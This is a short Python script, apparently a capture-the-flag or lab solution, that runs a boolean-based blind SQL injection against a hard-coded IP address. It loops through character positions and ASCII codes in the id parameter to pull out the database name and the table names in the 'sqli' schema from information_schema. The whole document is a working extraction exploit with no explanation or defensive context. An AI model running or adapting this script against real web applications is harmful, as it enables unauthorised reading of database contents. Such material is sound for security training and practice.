import requests
import string
s = string.printable
flag = ''

url = 'http://122.51.52.109:6007/bool/'
for i in range(1,40):
    for j in range(32,128):
        
        # database
        # u = url+"?id=if(ascii(substr(database(),{0},1))={1},1,0)".format(i,j)

        # tables
        u = url+"?id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='sqli'),{0},1))={1},1,0)".format(i,j)
        r = requests.get(u)

        if "query_success" in r.text:
            flag += chr(j)
            print(flag)